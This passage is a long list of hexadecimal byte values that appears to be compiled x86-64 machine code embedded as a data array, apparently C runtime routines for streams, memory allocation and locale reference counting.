0x8b, 0x8b, 0x50, 0x10, 0x8b, 0xcb, 0x48, 0x8b, 0xc6, 0x4c, 0x8b, 0x5, 0x72, 0x5f, 0x0, 0x0, 0x41, 0xff, 0xd0, 0xeb, 0x18, 0x49, 0xba, 0x70, 0x73, 0xd7, 0x50, 0x49, 0x86, 0xc1, 0xc6, 0x8b, 0xcb, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x15, 0x57, 0x5f, 0x0, 0x0, 0xff, 0xd2, 0x83, 0xfb, 0xb, 0x77, 0xb4, 0x41, 0xf, 0xa3, 0xdc, 0x73, 0xae, 0x48, 0x8b, 0x84, 0x24, 0x80, 0x0, 0x0, 0x0, 0x49, 0x89, 0x45, 0x8, 0x83, 0xfb, 0x8, 0x75, 0x9d, 0xe8, 0xdc, 0xce, 0xff, 0xff, 0x8b, 0x4c, 0x24, 0x78, 0x89, 0x48, 0x10, 0xeb, 0x8f, 0x45, 0x84, 0xf6, 0x74, 0x8, 0x8d, 0x4e, 0x3, 0xe8, 0xc2, 0xd2, 0xff, 0xff, 0xb9, 0x3, 0x0, 0x0, 0x0, 0xe8, 0xc8, 0xbe, 0xff, 0xff, 0x90, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0x15, 0x81, 0xfd, 0x0, 0x0, 0x8b, 0xca, 0x48, 0x33, 0x15, 0x98, 0x13, 0x1, 0x0, 0x83, 0xe1, 0x3f, 0x48, 0xd3, 0xca, 0x48, 0x85, 0xd2, 0xf, 0x95, 0xc0, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0xd, 0x81, 0x13, 0x1, 0x0, 0xc3, 0x48, 0x8b, 0x15, 0x59, 0xfd, 0x0, 0x0, 0x4c, 0x8b, 0xc1, 0x8b, 0xca, 0x48, 0x33, 0x15, 0x6d, 0x13, 0x1, 0x0, 0x83, 0xe1, 0x3f, 0x48, 0xd3, 0xca, 0x48, 0x85, 0xd2, 0x75, 0x3, 0x33, 0xc0, 0xc3, 0x49, 0xba, 0x70, 0x71, 0x54, 0x58, 0xe6, 0x7, 0x88, 0xd8, 0x49, 0x8b, 0xc8, 0x48, 0x8b, 0xc2, 0x48, 0xff, 0x25, 0xb0, 0x5e, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xd8, 0x48, 0x8b, 0xa, 0xe8, 0xa3, 0x4, 0x0, 0x0, 0x90, 0x48, 0x8b, 0x53, 0x8, 0x48, 0x8b, 0x3, 0x48, 0x8b, 0x8, 0x48, 0x85, 0xc9, 0x74, 0x5a, 0x8b, 0x49, 0x14, 0x8b, 0xc1, 0xc1, 0xe8, 0xd, 0x24, 0x1, 0x74, 0x4e, 0x8b, 0xc1, 0x24, 0x3, 0x3c, 0x2, 0x75, 0x5, 0xf6, 0xc1, 0xc0, 0x75, 0xa, 0xf, 0xba, 0xe1, 0xb, 0x72, 0x4, 0xff, 0x2, 0xeb, 0x37, 0x48, 0x8b, 0x43, 0x10, 0x80, 0x38, 0x0, 0x75, 0xf, 0x48, 0x8b, 0x3, 0x48, 0x8b, 0x8, 0x8b, 0x41, 0x14, 0xd1, 0xe8, 0x24, 0x1, 0x74, 0x1f, 0x48, 0x8b, 0xb, 0x48, 0x8b, 0x9, 0xe8, 0xf5, 0x1, 0x0, 0x0, 0x83, 0xf8, 0xff, 0x74, 0x8, 0x48, 0x8b, 0x43, 0x8, 0xff, 0x0, 0xeb, 0x7, 0x48, 0x8b, 0x43, 0x18, 0x83, 0x8, 0xff, 0x48, 0x8b, 0xf, 0xe8, 0x3d, 0x4, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x56, 0x57, 0x41, 0x56, 0x48, 0x83, 0xec, 0x60, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xf0, 0x8b, 0xa, 0xe8, 0x45, 0xd1, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x1d, 0x9d, 0x12, 0x1, 0x0, 0x48, 0x63, 0x5, 0x8e, 0x12, 0x1, 0x0, 0x4c, 0x8d, 0x34, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x38, 0x49, 0x3b, 0xde, 0xf, 0x84, 0x88, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x3, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8b, 0x16, 0x48, 0x85, 0xc0, 0x74, 0x21, 0x8b, 0x48, 0x14, 0x8b, 0xc1, 0xc1, 0xe8, 0xd, 0x24, 0x1, 0x74, 0x15, 0x8b, 0xc1, 0x24, 0x3, 0x3c, 0x2, 0x75, 0x5, 0xf6, 0xc1, 0xc0, 0x75, 0xe, 0xf, 0xba, 0xe1, 0xb, 0x72, 0x8, 0xff, 0x2, 0x48, 0x83, 0xc3, 0x8, 0xeb, 0xbb, 0x48, 0x8b, 0x56, 0x10, 0x48, 0x8b, 0x4e, 0x8, 0x48, 0x8b, 0x6, 0x4c, 0x8d, 0x44, 0x24, 0x20, 0x4c, 0x89, 0x44, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x89, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x54, 0x24, 0x58, 0x48, 0x8b, 0x44, 0x24, 0x20, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4c, 0x24, 0x28, 0x4c, 0x8d, 0x44, 0x24, 0x40, 0x48, 0x8d, 0x54, 0x24, 0x30, 0x48, 0x8d, 0x8c, 0x24, 0x88, 0x0, 0x0, 0x0, 0xe8, 0x9e, 0xfe, 0xff, 0xff, 0xeb, 0xa9, 0x8b, 0xf, 0xe8, 0xe9, 0xd0, 0xff, 0xff, 0x48, 0x8b, 0x9c, 0x24, 0x80, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x60, 0x41, 0x5e, 0x5f, 0x5e, 0xc3, 0x88, 0x4c, 0x24, 0x8, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x40, 0x83, 0x65, 0x28, 0x0, 0x48, 0x8d, 0x45, 0x28, 0x83, 0x65, 0x20, 0x0, 0x4c, 0x8d, 0x4d, 0xe0, 0x48, 0x89, 0x45, 0xe8, 0x4c, 0x8d, 0x45, 0xe8, 0x48, 0x8d, 0x45, 0x10, 0x48, 0x89, 0x45, 0xf0, 0x48, 0x8d, 0x55, 0xe4, 0x48, 0x8d, 0x45, 0x20, 0x48, 0x89, 0x45, 0xf8, 0x48, 0x8d, 0x4d, 0x18, 0xb8, 0x8, 0x0, 0x0, 0x0, 0x89, 0x45, 0xe0, 0x89, 0x45, 0xe4, 0xe8, 0xd4, 0xfe, 0xff, 0xff, 0x80, 0x7d, 0x10, 0x0, 0x8b, 0x45, 0x20, 0xf, 0x45, 0x45, 0x28, 0x48, 0x83, 0xc4, 0x40, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xea, 0x8b, 0x49, 0x14, 0x8b, 0xc1, 0x24, 0x3, 0x3c, 0x2, 0x75, 0x4e, 0xf6, 0xc1, 0xc0, 0x74, 0x49, 0x8b, 0x3b, 0x2b, 0x7b, 0x8, 0x83, 0x63, 0x10, 0x0, 0x48, 0x8b, 0x73, 0x8, 0x48, 0x89, 0x33, 0x85, 0xff, 0x7e, 0x35, 0x48, 0x8b, 0xcb, 0xe8, 0x66, 0x5, 0x0, 0x0, 0x4c, 0x8b, 0xcd, 0x44, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x8b, 0xc8, 0xe8, 0x76, 0x27, 0x0, 0x0, 0x3b, 0xf8, 0x74, 0xa, 0xf0, 0x83, 0x4b, 0x14, 0x10, 0x83, 0xc8, 0xff, 0xeb, 0x11, 0x8b, 0x43, 0x14, 0xc1, 0xe8, 0x2, 0xa8, 0x1, 0x74, 0x5, 0xf0, 0x83, 0x63, 0x14, 0xfd, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x7c, 0x24, 0x10, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x60, 0x48, 0x83, 0x65, 0xc0, 0x0, 0x48, 0x8b, 0xd9, 0x83, 0x3d, 0xf7, 0x10, 0x1, 0x0, 0x0, 0xc6, 0x45, 0xd0, 0x0, 0xc6, 0x45, 0xe8, 0x0, 0xc6, 0x45, 0xf0, 0x0, 0xc6, 0x45, 0xf8, 0x0, 0x75, 0x10, 0xf, 0x10, 0x5, 0x6e, 0x1, 0x1, 0x0, 0xc6, 0x45, 0xe8, 0x1, 0xf3, 0xf, 0x7f, 0x45, 0xd8, 0x48, 0x85, 0xdb, 0x75, 0xb, 0x33, 0xc9, 0xe8, 0xc5, 0xfe, 0xff, 0xff, 0x8b, 0xf8, 0xeb, 0x31, 0x48, 0x8d, 0x55, 0xc0, 0xe8, 0x18, 0xff, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x5, 0x83, 0xcf, 0xff, 0xeb, 0x1f, 0x8b, 0x43, 0x14, 0xc1, 0xe8, 0xb, 0xa8, 0x1, 0x74, 0x13, 0x48, 0x8b, 0xcb, 0xe8, 0xa9, 0x4, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0x12, 0x1e, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xde, 0x33, 0xff, 0x80, 0x7d, 0xe8, 0x2, 0x75, 0xb, 0x48, 0x8b, 0x45, 0xc0, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x80, 0x7d, 0xf0, 0x0, 0x74, 0xf, 0x8b, 0x5d, 0xec, 0x48, 0x8d, 0x4d, 0xc0, 0xe8, 0xd9, 0xc5, 0xff, 0xff, 0x89, 0x58, 0x20, 0x80, 0x7d, 0xf8, 0x0, 0x74, 0xf, 0x8b, 0x5d, 0xf4, 0x48, 0x8d, 0x4d, 0xc0, 0xe8, 0xc4, 0xc5, 0xff, 0xff, 0x89, 0x58, 0x24, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x8b, 0xc7, 0x48, 0x8b, 0x7c, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x60, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0xb1, 0x1, 0xe9, 0x39, 0xfe, 0xff, 0xff, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x8b, 0x5, 0xf5, 0xf, 0x1, 0x0, 0x33, 0xdb, 0xbf, 0x3, 0x0, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x7, 0xb8, 0x0, 0x2, 0x0, 0x0, 0xeb, 0x5, 0x3b, 0xc7, 0xf, 0x4c, 0xc7, 0x48, 0x63, 0xc8, 0xba, 0x8, 0x0, 0x0, 0x0, 0x89, 0x5, 0xd0, 0xf, 0x1, 0x0, 0xe8, 0x3, 0xd4, 0xff, 0xff, 0x33, 0xc9, 0x48, 0x89, 0x5, 0xca, 0xf, 0x1, 0x0, 0xe8, 0x6d, 0xd4, 0xff, 0xff, 0x48, 0x39, 0x1d, 0xbe, 0xf, 0x1, 0x0, 0x75, 0x2f, 0xba, 0x8, 0x0, 0x0, 0x0, 0x89, 0x3d, 0xa9, 0xf, 0x1, 0x0, 0x48, 0x8b, 0xcf, 0xe8, 0xd9, 0xd3, 0xff, 0xff, 0x33, 0xc9, 0x48, 0x89, 0x5, 0xa0, 0xf, 0x1, 0x0, 0xe8, 0x43, 0xd4, 0xff, 0xff, 0x48, 0x39, 0x1d, 0x94, 0xf, 0x1, 0x0, 0x75, 0x5, 0x83, 0xc8, 0xff, 0xeb, 0x75, 0x48, 0x8b, 0xeb, 0x48, 0x8d, 0x35, 0x63, 0x0, 0x1, 0x0, 0x4c, 0x8d, 0x35, 0x44, 0x0, 0x1, 0x0, 0x49, 0x8d, 0x4e, 0x30, 0x45, 0x33, 0xc0, 0xba, 0xa0, 0xf, 0x0, 0x0, 0xe8, 0x7f, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x5, 0x64, 0xf, 0x1, 0x0, 0x4c, 0x8d, 0x5, 0x15, 0xb, 0x1, 0x0, 0x48, 0x8b, 0xd5, 0x48, 0xc1, 0xfa, 0x6, 0x4c, 0x89, 0x34, 0x3, 0x48, 0x8b, 0xc5, 0x83, 0xe0, 0x3f, 0x48, 0x8d, 0xc, 0xc0, 0x49, 0x8b, 0x4, 0xd0, 0x48, 0x8b, 0x4c, 0xc8, 0x28, 0x48, 0x83, 0xc1, 0x2, 0x48, 0x83, 0xf9, 0x2, 0x77, 0x6, 0xc7, 0x6, 0xfe, 0xff, 0xff, 0xff, 0x48, 0xff, 0xc5, 0x49, 0x83, 0xc6, 0x58, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x83, 0xc6, 0x58, 0x48, 0x83, 0xef, 0x1, 0x75, 0x9e, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0xe8, 0xcd, 0xfe, 0xff, 0xff, 0xe8, 0x6c, 0x29, 0x0, 0x0, 0x33, 0xdb, 0x48, 0x8b, 0xd, 0xe3, 0xe, 0x1, 0x0, 0x48, 0x8b, 0xc, 0xb, 0xe8, 0xe, 0x2a, 0x0, 0x0, 0x48, 0x8b, 0x5, 0xd3, 0xe, 0x1, 0x0, 0x48, 0x8b, 0xc, 0x3, 0x48, 0x83, 0xc1, 0x30, 0xff, 0x15, 0x5d, 0x58, 0x0, 0x0, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x83, 0xfb, 0x18, 0x75, 0xd1, 0x48, 0x8b, 0xd, 0xb4, 0xe, 0x1, 0x0, 0xe8, 0x57, 0xd3, 0xff, 0xff, 0x48, 0x83, 0x25, 0xa7, 0xe, 0x1, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x48, 0x83, 0xc1, 0x30, 0x48, 0xff, 0x25, 0x1d, 0x58, 0x0, 0x0, 0xcc, 0x48, 0x83, 0xc1, 0x30, 0x48, 0xff, 0x25, 0x19, 0x58, 0x0, 0x0, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x83, 0xf9, 0xe0, 0x77, 0x3c, 0x48, 0x85, 0xc9, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0xf, 0x44, 0xd8, 0xeb, 0x15, 0xe8, 0x6e, 0x7, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x25, 0x48, 0x8b, 0xcb, 0xe8, 0x12, 0xf7, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x19, 0x48, 0x8b, 0xd, 0xf7, 0x9, 0x1, 0x0, 0x4c, 0x8b, 0xc3, 0x33, 0xd2, 0xff, 0x15, 0x64, 0x58, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xd4, 0xeb, 0xd, 0xe8, 0x48, 0xd2, 0xff, 0xff, 0xc7, 0x0, 0xc, 0x0, 0x0, 0x0, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x5, 0xb, 0xe, 0x1, 0x0, 0x48, 0x8b, 0xda, 0x48, 0x39, 0x2, 0x74, 0x16, 0x8b, 0x81, 0xa8, 0x3, 0x0, 0x0, 0x85, 0x5, 0xd7, 0xff, 0x0, 0x0, 0x75, 0x8, 0xe8, 0x30, 0x6, 0x0, 0x0, 0x48, 0x89, 0x3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x5, 0xd7, 0xd, 0x1, 0x0, 0x48, 0x8b, 0xda, 0x4a, 0x8b, 0x4, 0xc0, 0x48, 0x39, 0x2, 0x74, 0x16, 0x8b, 0x81, 0xa8, 0x3, 0x0, 0x0, 0x85, 0x5, 0x9f, 0xff, 0x0, 0x0, 0x75, 0x8, 0xe8, 0xf8, 0x5, 0x0, 0x0, 0x48, 0x89, 0x3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x5, 0x87, 0x7, 0x1, 0x0, 0x48, 0x8b, 0xda, 0x48, 0x39, 0x2, 0x74, 0x16, 0x8b, 0x81, 0xa8, 0x3, 0x0, 0x0, 0x85, 0x5, 0x6b, 0xff, 0x0, 0x0, 0x75, 0x8, 0xe8, 0xec, 0xe7, 0xff, 0xff, 0x48, 0x89, 0x3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x5, 0x53, 0x7, 0x1, 0x0, 0x48, 0x8b, 0xda, 0x4a, 0x8b, 0x4, 0xc0, 0x48, 0x39, 0x2, 0x74, 0x16, 0x8b, 0x81, 0xa8, 0x3, 0x0, 0x0, 0x85, 0x5, 0x33, 0xff, 0x0, 0x0, 0x75, 0x8, 0xe8, 0xb4, 0xe7, 0xff, 0xff, 0x48, 0x89, 0x3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x30, 0x45, 0x33, 0xf6, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xe8, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xf9, 0x48, 0x85, 0xd2, 0xf, 0x84, 0x23, 0x1, 0x0, 0x0, 0x4d, 0x85, 0xc0, 0xf, 0x84, 0x1a, 0x1, 0x0, 0x0, 0x44, 0x38, 0x32, 0x75, 0x12, 0x48, 0x85, 0xc9, 0xf, 0x84, 0x13, 0x1, 0x0, 0x0, 0x66, 0x44, 0x89, 0x31, 0xe9, 0xa, 0x1, 0x0, 0x0, 0x45, 0x38, 0x71, 0x28, 0x75, 0x8, 0x48, 0x8b, 0xcb, 0xe8, 0xe9, 0xc2, 0xff, 0xff, 0x48, 0x8b, 0x53, 0x18, 0x44, 0x8b, 0x52, 0xc, 0x41, 0x81, 0xfa, 0xe9, 0xfd, 0x0, 0x0, 0x75, 0x27, 0x4c, 0x8d, 0xd, 0xf1, 0xc, 0x1, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x4c, 0x8b, 0xc5, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0xe8, 0x9a, 0x28, 0x0, 0x0, 0x83, 0xc9, 0xff, 0x85, 0xc0, 0xf, 0x48, 0xc1, 0xe9, 0xc6, 0x0, 0x0, 0x0, 0x4c, 0x39, 0xb2, 0x38, 0x1, 0x0, 0x0, 0x75, 0x14, 0x48, 0x85, 0xff, 0xf, 0x84, 0xa4, 0x0, 0x0, 0x0, 0xf, 0xb6, 0x6, 0x66, 0x89, 0x7, 0xe9, 0x99, 0x0, 0x0, 0x0, 0xf, 0xb6, 0xe, 0x48, 0x8b, 0x2, 0x66, 0x44, 0x39, 0x34, 0x48, 0x7d, 0x61, 0x44, 0x8b, 0x4a, 0x8, 0x41, 0x83, 0xf9, 0x1, 0x7e, 0x2b, 0x41, 0x3b, 0xe9, 0x7c, 0x26, 0x41, 0x8b, 0xc6, 0x48, 0x85, 0xff, 0x4c, 0x8b, 0xc6, 0xba, 0x9, 0x0, 0x0, 0x0, 0xf, 0x95, 0xc0, 0x41, 0x8b, 0xca, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x42, 0xea, 0xff, 0xff, 0x85, 0xc0, 0x75, 0x13, 0x48, 0x8b, 0x43, 0x18, 0x48, 0x63, 0x48, 0x8, 0x48, 0x3b, 0xe9, 0x72, 0xf, 0x44, 0x38, 0x76, 0x1, 0x74, 0x9, 0x48, 0x8b, 0x43, 0x18, 0x8b, 0x40, 0x8, 0xeb, 0x4b, 0xc6, 0x43, 0x30, 0x1, 0x83, 0xc8, 0xff, 0xc7, 0x43, 0x2c, 0x2a, 0x0, 0x0, 0x0, 0xeb, 0x3b, 0x41, 0x8b, 0xc6, 0x41, 0xb9, 0x1, 0x0, 0x0, 0x0, 0x48, 0x85, 0xff, 0x4c, 0x8b, 0xc6, 0x41, 0x8b, 0xca, 0xf, 0x95, 0xc0, 0x89, 0x44, 0x24, 0x28, 0x41, 0x8d, 0x51, 0x8, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0xeb, 0xe9, 0xff, 0xff, 0x85, 0xc0, 0x74, 0xc5, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x9, 0x4c, 0x89, 0x35, 0xd, 0xc, 0x1, 0x0, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5e, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x48, 0x85, 0xc9, 0x75, 0x15, 0xe8, 0xda, 0xcf, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x93, 0xce, 0xff, 0xff, 0x83, 0xc8, 0xff, 0xeb, 0x3, 0x8b, 0x41, 0x18, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x30, 0x49, 0x8b, 0xf9, 0x8b, 0xa, 0xe8, 0x32, 0xca, 0xff, 0xff, 0x90, 0x48, 0x8d, 0x1d, 0x7a, 0xb, 0x1, 0x0, 0x48, 0x8d, 0x35, 0xdb, 0xfa, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x48, 0x8d, 0x5, 0x6f, 0xb, 0x1, 0x0, 0x48, 0x3b, 0xd8, 0x74, 0x19, 0x48, 0x39, 0x33, 0x74, 0xe, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcb, 0xe8, 0x2, 0x4, 0x0, 0x0, 0x48, 0x89, 0x3, 0x48, 0x83, 0xc3, 0x8, 0xeb, 0xd6, 0x8b, 0xf, 0xe8, 0x46, 0xca, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x74, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0xcc, 0xcc, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x87, 0x5, 0x55, 0xb, 0x1, 0x0, 0xc3, 0x4c, 0x8b, 0xdc, 0x48, 0x83, 0xec, 0x28, 0xb8, 0x4, 0x0, 0x0, 0x0, 0x4d, 0x8d, 0x4b, 0x10, 0x4d, 0x8d, 0x43, 0x8, 0x89, 0x44, 0x24, 0x38, 0x49, 0x8d, 0x53, 0x18, 0x89, 0x44, 0x24, 0x40, 0x49, 0x8d, 0x4b, 0x8, 0xe8, 0x5b, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xf0, 0xff, 0x41, 0x10, 0x48, 0x8b, 0x81, 0xe0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3, 0xf0, 0xff, 0x0, 0x48, 0x8b, 0x81, 0xf0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3, 0xf0, 0xff, 0x0, 0x48, 0x8b, 0x81, 0xe8, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3, 0xf0, 0xff, 0x0, 0x48, 0x8b, 0x81, 0x0, 0x1, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3, 0xf0, 0xff, 0x0, 0x48, 0x8d, 0x41, 0x38, 0x41, 0xb8, 0x6, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x15, 0x73, 0xfb, 0x0, 0x0, 0x48, 0x39, 0x50, 0xf0, 0x74, 0xb, 0x48, 0x8b, 0x10, 0x48, 0x85, 0xd2, 0x74, 0x3, 0xf0, 0xff, 0x2, 0x48, 0x83, 0x78, 0xe8, 0x0, 0x74, 0xc, 0x48, 0x8b, 0x50, 0xf8, 0x48, 0x85, 0xd2, 0x74, 0x3, 0xf0, 0xff, 0x2, 0x48, 0x83, 0xc0, 0x20, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xcb, 0x48, 0x8b, 0x89, 0x20, 0x1, 0x0, 0x0, 0xe9, 0x79, 0x1, 0x0, 0x0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x81, 0xf8, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x48, 0x85, 0xc0, 0x74, 0x79, 0x48, 0x8d, 0xd, 0x26, 0xfc, 0x0, 0x0, 0x48, 0x3b, 0xc1, 0x74, 0x6d, 0x48, 0x8b, 0x83, 0xe0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x61, 0x83, 0x38, 0x0, 0x75, 0x5c, 0x48, 0x8b, 0x8b, 0xf0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc9, 0x74, 0x16, 0x83, 0x39, 0x0, 0x75, 0x11, 0xe8, 0xca, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xf8, 0x0, 0x0, 0x0, 0xe8, 0xd2, 0x27, 0x0, 0x0, 0x48, 0x8b, 0x8b, 0xe8, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc9, 0x74, 0x16, 0x83, 0x39, 0x0, 0x75, 0x11, 0xe8, 0xa8, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xf8, 0x0, 0x0, 0x0, 0xe8, 0xbc, 0x28, 0x0, 0x0, 0x48, 0x8b, 0x8b, 0xe0, 0x0, 0x0, 0x0, 0xe8, 0x90, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xf8, 0x0, 0x0, 0x0, 0xe8, 0x84, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x83, 0x0, 0x1, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x47, 0x83, 0x38, 0x0, 0x75, 0x42, 0x48, 0x8b, 0x8b, 0x8, 0x1, 0x0, 0x0, 0x48, 0x81, 0xe9, 0xfe, 0x0, 0x0, 0x0, 0xe8, 0x60, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x10, 0x1, 0x0, 0x0, 0xbf, 0x80, 0x0, 0x0, 0x0, 0x48, 0x2b, 0xcf, 0xe8, 0x4c, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x18, 0x1, 0x0, 0x0, 0x48, 0x2b, 0xcf, 0xe8, 0x3d, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x0, 0x1, 0x0, 0x0, 0xe8, 0x31, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x20, 0x1, 0x0, 0x0, 0xe8, 0xa5, 0x0, 0x0, 0x0, 0x48, 0x8d, 0xb3, 0x28, 0x1, 0x0, 0x0, 0xbd, 0x6, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x7b, 0x38, 0x48, 0x8d, 0x5, 0x26, 0xfa, 0x0, 0x0, 0x48, 0x39, 0x47, 0xf0, 0x74, 0x1a, 0x48, 0x8b, 0xf, 0x48, 0x85, 0xc9, 0x74, 0x12, 0x83, 0x39, 0x0, 0x75, 0xd, 0xe8, 0xf6, 0xcd, 0xff, 0xff, 0x48, 0x8b, 0xe, 0xe8, 0xee, 0xcd, 0xff, 0xff, 0x48, 0x83, 0x7f, 0xe8, 0x0, 0x74, 0x13, 0x48, 0x8b, 0x4f, 0xf8, 0x48, 0x85, 0xc9, 0x74, 0xa, 0x83, 0x39, 0x0, 0x75, 0x5, 